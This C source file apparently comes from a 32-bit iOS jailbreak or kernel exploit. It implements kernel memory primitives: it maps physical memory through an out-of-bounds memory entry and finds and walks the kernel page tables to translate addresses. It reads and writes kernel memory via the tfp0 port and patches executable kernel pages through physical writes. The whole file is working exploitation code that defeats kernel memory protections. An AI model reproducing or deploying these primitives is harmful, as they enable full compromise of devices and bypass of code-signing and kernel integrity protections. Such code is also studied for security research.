#include "oob_entry.h"
#include "util.h"
#include "memory.h"

uint8_t *map_data(uint32_t pa, uint32_t size, vm_prot_t prot) {
    uint32_t map_offset = (pa & ~0xfff) - kinfo->mapping_base;
    mach_vm_address_t mapped = 0;
    if (mach_vm_map(mach_task_self(), &mapped, size, 0, 1, kinfo->oob_entry, map_offset, 0, prot, prot, 0) != 0) return NULL;
    mem_sync();
    return (uint8_t *)mapped;;
}

uint8_t *map_relative_data(uint32_t offset, uint32_t size, vm_prot_t prot) {
    mach_vm_address_t mapped = 0;
    if (mach_vm_map(mach_task_self(), &mapped, size, 0, 1, kinfo->oob_entry, offset, 0, prot, prot, 0) != 0) return NULL;
    mem_sync();
    return (uint8_t *)mapped;
}

void unmap_data(uint8_t *addr, uint32_t size) {
    if (addr == NULL) return;
    mem_barrier();
    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)addr, size);
}

void physread_buf(uint32_t addr, void *data, uint32_t size) {
    uint32_t read_offset = addr & 0xfff;
    uint32_t map_size = (size + 0xfff) & ~0xfff;

    uint8_t *mapped = map_data((addr & ~0xfff), map_size, VM_PROT_READ);
    uint8_t *dest = (uint8_t *)data;
    uint8_t *src = (uint8_t *)(mapped + read_offset);

    while (size--) *dest++ = *src++;
    unmap_data(mapped, map_size);
}

void physwrite_buf(uint32_t addr, void *data, uint32_t size) {
    uint32_t write_offset = addr & 0xfff;
    uint32_t map_size = (size + 0xfff) & ~0xfff;

    uint8_t *mapped = map_data((addr & ~0xfff), map_size, VM_PROT_READ | VM_PROT_WRITE);
    uint8_t *dest = (uint8_t *)(mapped + write_offset);
    uint8_t *src = (uint8_t *)data;
    
    while (size--) *dest++ = *src++;
    unmap_data(mapped, map_size);
}

uint32_t physread32(uint32_t addr) {
    uint32_t value = 0;
    physread_buf(addr, &value, 0x4);
    return value;
}

void physwrite32(uint32_t addr, uint32_t data) {
    physwrite_buf(addr, &data, 0x4);
}

uint32_t kvtophys(uint32_t va) {
    if (kinfo->version[0] <= 5) {
        return va - (kinfo->kernel_static_base - kinfo->kernel_phys_base);
    } else if (kinfo->version[0] <= 9) {
        return va - kinfo->kernel_slide;
    }
    
    if (kinfo->kern_tte_phys == 0) {
        uint8_t *mapped = map_data(kinfo->mem_base, 0x1000000, VM_PROT_READ);
        for (uint32_t i = 0; i < 0x1000000-0x1000; i+=0x4) {
            uint32_t *data = (uint32_t *)(mapped + i);
            if (data[0] == PAGE_SIZE && data[1] == PAGE_MASK && data[2] == PAGE_SHIFT) {
                for (uint32_t j = 0; j < 0x100; j++) {
                    if ((data[j] & 0x80000000) == 0x80000000 && data[j] != data[j+1] &&
                        (data[j] & 0xffff) == (data[j+1] & 0xffff)) {
                        kinfo->kern_tte_phys = data[j+1];
                        break;
                    }
                }
            }
            if (kinfo->kern_tte_phys != 0) break;
        }

        unmap_data(mapped, 0x1000000);
        if (kinfo->kern_tte_phys == 0) return 0;
    }
    
    uint32_t l1_index = va >> 20;
    uint32_t l1_desc_addr = kinfo->kern_tte_phys + (l1_index * 4);
    uint32_t l1_desc = physread32(l1_desc_addr);

    if ((l1_desc & 0x3) == 0x2) {
        return (l1_desc & 0xFFF00000) + (va & 0x000FFFFF);
    } else if ((l1_desc & 0x3) == 0x1) {
        uint32_t l2_index = (va >> 12) & 0xFF;
        uint32_t l2_desc_addr = (l1_desc & 0xFFFFFC00) + (l2_index * 4);
        uint32_t l2_desc = physread32(l2_desc_addr);

        if ((l2_desc & 0x3) == 0x2) {
            return (l2_desc & 0xFFFF0000) + (va & 0xFFFF);
        } else if ((l2_desc & 0x3) == 0x1 || (l2_desc & 0x3) == 0x3) {
            return (l2_desc & 0xFFFFF000) + (va & 0xFFF);
        }
    }
    return 0;
}

void kread_buf(uint32_t addr, void *data, uint32_t size) {
    uint32_t offset = 0;
    while (offset < size) {
        mach_vm_size_t read_size = 2048;
        mach_vm_size_t out_size = 0;

        if (read_size > size - offset) read_size = size - offset;
        mach_vm_read_overwrite(kinfo->tfp0, addr + offset, read_size, (mach_vm_address_t)data + offset, &out_size);
        if (out_size == 0) break;
        offset += out_size;
    }
}

void kwrite_buf(uint32_t addr, void *data, uint32_t size) {
    uint32_t offset = 0;
    while (offset < size) {
        mach_msg_type_number_t write_size = 2048;
        if (write_size > size - offset) write_size = size - offset;
        if (mach_vm_write(kinfo->tfp0, addr + offset, (uint32_t)data + offset, write_size) != 0) break;
        offset += write_size;
    }
}

void kwrite_buf_exec(uint32_t addr, void *data, uint32_t size) {
    uint32_t pa = kvtophys(addr);
    if (pa == 0) return;
    return physwrite_buf(pa, data, size);
}

uint32_t kread32(uint32_t addr) {
    uint32_t value = 0;
    kread_buf(addr, &value, 0x4);
    return value;
}

uint16_t kread16(uint32_t addr) {
    uint16_t value = 0;
    kread_buf(addr, &value, 0x2);
    return value;
}

uint8_t kread8(uint32_t addr) {
    uint8_t value = 0;
    kread_buf(addr, &value, 0x1);
    return value;
}

void kwrite32(uint32_t addr, uint32_t data) {
    kwrite_buf(addr, &data, 0x4);
}

void kwrite16(uint32_t addr, uint16_t data) {
    kwrite_buf(addr, &data, 0x2);
}

void kwrite8(uint32_t addr, uint8_t data) {
    kwrite_buf(addr, &data, 0x1);
}

void kwrite32_exec(uint32_t addr, uint32_t data) {
    kwrite_buf_exec(addr, &data, 0x4);
}

void kwrite16_exec(uint32_t addr, uint16_t data) {
    kwrite_buf_exec(addr, &data, 0x2);
}

void kwrite8_exec(uint32_t addr, uint8_t data) {
    kwrite_buf_exec(addr, &data, 0x1);
}

uint32_t kalloc(size_t size) {
    mach_vm_address_t addr = 0;
    if (mach_vm_allocate(kinfo->tfp0, &addr, size, VM_FLAGS_ANYWHERE) != 0) return 0;
    return (uint32_t)addr;
}

void kfree(uint32_t addr, size_t size) {
    mach_vm_deallocate(kinfo->tfp0, (mach_vm_address_t)addr, size);
}
